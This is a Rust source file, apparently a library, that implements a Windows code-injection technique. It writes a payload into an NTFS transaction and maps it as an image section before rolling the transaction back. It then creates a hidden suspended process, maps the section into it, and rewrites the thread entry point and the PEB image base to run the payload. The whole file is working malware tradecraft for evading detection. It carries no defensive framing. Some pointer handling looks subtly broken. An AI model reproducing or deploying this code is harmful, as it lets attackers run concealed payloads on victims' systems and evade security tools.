#![no_std]

extern crate alloc;

use alloc::vec::Vec;
use core::ffi::c_void;
use core::mem::zeroed;
use core::ptr::{copy_nonoverlapping, null_mut};
use ntapi::ntmmapi::{NtCreateSection, NtMapViewOfSection, ViewShare};
use utils::WideString;
use winapi::um::winbase::{CREATE_NO_WINDOW, DETACHED_PROCESS};
use windows_sys::core::{PCWSTR, PWSTR};
use windows_sys::Win32::Foundation::{CloseHandle, BOOL, FALSE, GENERIC_READ, GENERIC_WRITE, HANDLE, INVALID_HANDLE_VALUE, STATUS_IMAGE_NOT_AT_BASE, STATUS_SUCCESS, TRUE};
use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
use windows_sys::Win32::Storage::FileSystem::{CreateFileTransactedW, CreateFileW, CreateTransaction, GetFileSize, RollbackTransaction, WriteFile, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, OPEN_EXISTING};
use windows_sys::Win32::System::Diagnostics::Debug::{SetThreadContext, WriteProcessMemory, IMAGE_NT_HEADERS32, IMAGE_NT_HEADERS64};
use windows_sys::Win32::System::Memory::{CreateFileMappingW, MapViewOfFile, UnmapViewOfFile, FILE_MAP_READ, PAGE_READONLY, SECTION_ALL_ACCESS, SEC_IMAGE};
use windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
use windows_sys::Win32::System::Threading::{CREATE_SUSPENDED, PROCESS_INFORMATION, STARTUPINFOW};

type PVoid = *const c_void;
type PByte = *const u8;

macro_rules! module_function {
    (
        $module:expr,
        $name:ident,
        fn($($arg:ident : $arg_ty:ty),*) -> $ret:ty
    ) => {
        #[allow(non_snake_case)]
        unsafe fn $name($($arg: $arg_ty),*) -> $ret {
            use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
            use core::mem::transmute;

            let h_module = unsafe {
                GetModuleHandleA(concat!($module, "\0").as_bytes().as_ptr() as _)
            };

            if h_module.is_null() {
                panic!("Couldn't get module handle for module {}", stringify!($module));
            }

            unsafe {
                (transmute::<_, unsafe extern "system" fn($($arg_ty),*) -> $ret>(
                    GetProcAddress(
                        h_module,
                        concat!(stringify!($name), "\0").as_bytes().as_ptr() as _,
                    )
                ))($($arg),*)
            }
        }
    };
}

macro_rules! thread_context {
    ($thread:expr) => {{
        use windows_sys::Win32::{
            Foundation::FALSE,
            System::Diagnostics::Debug::{GetThreadContext, CONTEXT, WOW64_CONTEXT_INTEGER}
        };

        let mut context = CONTEXT {
            ContextFlags: WOW64_CONTEXT_INTEGER,
            ..unsafe { zeroed() }
        };

        if unsafe {
            GetThreadContext($thread, &mut context)
        } == FALSE {
            None
        } else {
            Some(context)
        }
    }};
}

module_function!(
    "kernel32.dll",
    CreateProcessInternalW,
    fn(
        h_token: HANDLE,
        application_name: PCWSTR,
        command_line: PWSTR,
        process_attributes: *mut SECURITY_ATTRIBUTES,
        thread_attributes: *mut SECURITY_ATTRIBUTES,
        inherit_handles: BOOL,
        creation_flags: u32,
        environment: HANDLE,
        current_directory: PCWSTR,
        startup_info: *mut STARTUPINFOW,
        process_information: *mut PROCESS_INFORMATION,
        p_handle: *mut HANDLE
    ) -> BOOL
);

macro_rules! check {
    ($handle:expr) => {
        if $handle == INVALID_HANDLE_VALUE {
            return Err(INVALID_HANDLE_VALUE as _);
        }
    };
}

pub fn make_transacted_section<S>(dummy_name: S, payload: &[u8]) -> Result<HANDLE, i32>
where
    S: AsRef<str>
{
    let dummy_name = dummy_name.as_ref().to_wide();

    let options = 0u32;
    let isolation_lvl = 0u32;
    let isolation_flags = 0u32;
    let timeout = 0u32;

    let transaction = unsafe {
        CreateTransaction(
            null_mut(),
            null_mut(),
            options,
            isolation_lvl,
            isolation_flags,
            timeout,
            null_mut()
        )
    };

    check!(transaction);

    let transacted_file = unsafe {
        CreateFileTransactedW(
            dummy_name.as_ptr(),
            GENERIC_WRITE | GENERIC_READ,
            0,
            null_mut(),
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            null_mut(),
            transaction,
            null_mut(),
            null_mut()
        )
    };

    check!(transacted_file);

    let mut written_len = 0;
    if unsafe {
        WriteFile(
            transacted_file,
            payload.as_ptr() as _,
            payload.len() as _,
            &mut written_len,
            null_mut()
        )
    } == FALSE {
        return Err(INVALID_HANDLE_VALUE as _);
    }

    let section: HANDLE = null_mut();
    if unsafe {
        NtCreateSection(
            section as _,
            SECTION_ALL_ACCESS,
            null_mut(),
            null_mut(),
            PAGE_READONLY,
            SEC_IMAGE,
            transacted_file as _
        )
    } != STATUS_SUCCESS {
        return Err(INVALID_HANDLE_VALUE as _);
    }

    unsafe {
        CloseHandle(transacted_file)
    };

    if unsafe {
        RollbackTransaction(transaction)
    } == FALSE {
        return Err(INVALID_HANDLE_VALUE as _);
    }

    unsafe {
        CloseHandle(transaction)
    };

    Ok(section)
}

pub fn create_new_process_internal<S>(cmd_line: S, start_dir: S) -> Option<PROCESS_INFORMATION>
where
    S: AsRef<str>
{
    let cmd_line = cmd_line.as_ref().to_wide();
    let start_dir = start_dir.as_ref().to_wide();

    let mut si = STARTUPINFOW {
        cb: size_of::<STARTUPINFOW>() as _,
        ..unsafe { zeroed() }
    };

    let mut pi: PROCESS_INFORMATION = unsafe { zeroed() };

    let token: HANDLE = null_mut();
    let mut new_token: HANDLE = null_mut();
    if unsafe {
        CreateProcessInternalW(
            token,
            null_mut(),
            cmd_line.as_ptr() as _,
            null_mut(),
            null_mut(),
            FALSE,
            CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW,
            null_mut(),
            start_dir.as_ptr() as _,
            &mut si,
            &mut pi,
            &mut new_token,
        )
    } == FALSE {
        return None;
    }

    Some(pi)
}

pub fn map_buffer_into_process(process: HANDLE, section: HANDLE) -> Option<HANDLE> {
    let view_size = 0usize;
    let section_base_address: *mut c_void = null_mut();

    let status = unsafe {
        NtMapViewOfSection(
            section as *mut _ as _,
            process as *mut _ as _,
            section_base_address as _,
            0,
            0,
            null_mut(),
            view_size as _,
            ViewShare,
            0,
            PAGE_READONLY
        )
    };

    if status != STATUS_SUCCESS {
        if status != STATUS_IMAGE_NOT_AT_BASE {
            return None;
        }
    }

    Some(section_base_address)
}

pub fn get_payload_buffer<S>(filename: S) -> Option<Vec<u8>>
where
    S: AsRef<str>
{
    let filename = filename.as_ref().to_wide();
    let file = unsafe {
        CreateFileW(
            filename.as_ptr(),
            GENERIC_READ,
            FILE_SHARE_READ,
            null_mut(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            null_mut(),
        )
    };

    let mapping = unsafe {
        CreateFileMappingW(
            file,
            null_mut(),
            PAGE_READONLY,
            0,
            0,
            null_mut()
        )
    };

    if mapping == null_mut() {
        unsafe {
            CloseHandle(file)
        };

        return None;
    }

    let dll_data = unsafe {
        MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0)
    };

    let dll_raw_data = dll_data.Value as *mut u8;

    if dll_raw_data.is_null() {
        unsafe {
            CloseHandle(mapping);
            CloseHandle(file);
        }

        return None;
    }

    let payload_size = unsafe {
        GetFileSize(file, null_mut())
    } as usize;

    let mut buffer = Vec::with_capacity(payload_size);
    unsafe { buffer.set_len(payload_size) };

    unsafe {
        copy_nonoverlapping(
            dll_raw_data,
            buffer.as_mut_ptr(),
            payload_size
        );
    }

    unsafe {
        UnmapViewOfFile(dll_data);
        CloseHandle(mapping);
        CloseHandle(file);
    }

    Some(buffer)
}

fn update_remove_ep(thread: HANDLE, ep_va: u64) -> bool {
    let Some(mut context) = thread_context!(thread) else {
        return false
    };

    context.Rcx = ep_va;

    unsafe {
        SetThreadContext(thread, &mut context) == TRUE
    }
}

fn get_remote_peb_address(thread: HANDLE) -> Option<u64> {
    thread_context!(thread).map(|context| context.Rdx)
}

fn get_ep_rva(pe_buffer: PByte) -> u32 {
    let payload_dos_hdr = pe_buffer as *mut IMAGE_DOS_HEADER;

    macro_rules! address_of_entry_point {
        ($ptr:expr, $image:ty) => {{
            (*($ptr as *mut $image)).OptionalHeader.AddressOfEntryPoint
        }};
    }

    unsafe {
        let e_lfanew = (*payload_dos_hdr).e_lfanew as usize;
        let ptr = pe_buffer.add(e_lfanew);

        if cfg!(target_arch= "x86_64") {
            address_of_entry_point!(ptr, IMAGE_NT_HEADERS64)
        } else {
            address_of_entry_point!(ptr, IMAGE_NT_HEADERS32)
        }
    }
}

fn redirect_ep(thread: HANDLE, loaded_pe: PByte, loaded_base: PVoid) -> bool {
    let ep = get_ep_rva(loaded_pe);
    let ep_va = (loaded_base as usize).wrapping_add(ep as usize) as u64;

    update_remove_ep(thread, ep_va)
}

fn set_new_image_base(process: HANDLE, thread: HANDLE, loaded_base: PVoid) -> bool {
    let Some(remote_peb_address) = get_remote_peb_address(thread) else {
        return false
    };

    let img_base_size = size_of::<u64>();
    let offset = img_base_size * 2;
    let remote_img_base = (remote_peb_address as usize).wrapping_add(offset) as PVoid;

    let mut written = 0;
    unsafe {
        WriteProcessMemory(
            process,
            remote_img_base,
            loaded_base,
            img_base_size,
            &mut written
        ) == TRUE
    }
}

fn redirect_to_payload(loaded_pe: PByte, loaded_base: PVoid, process: HANDLE, thread: HANDLE) -> bool {
    redirect_ep(thread, loaded_pe, loaded_base)
        && set_new_image_base(process, thread, loaded_base)
}